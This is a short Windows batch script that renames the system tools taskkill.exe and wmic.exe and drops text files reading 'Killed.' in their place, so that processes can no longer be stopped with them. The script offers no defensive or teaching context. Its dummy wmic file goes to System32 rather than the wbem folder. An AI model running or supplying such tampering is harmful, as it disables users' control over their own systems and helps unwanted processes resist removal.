@echo off
::removes the commands to kill proccesses (doesnt delete just renames)
REM Rename the taskkill command
ren C:\Windows\System32\taskkill.exe taskkill_disabled.exe

REM Create a dummy taskkill executable
echo "Killed." > C:\Windows\System32\taskkill.exe

REM Rename the wmic command
ren C:\Windows\System32\wbem\wmic.exe wmic_disabled.exe

REM Create a dummy wmic executable
echo "Killed." > C:\Windows\System32\wmic.exe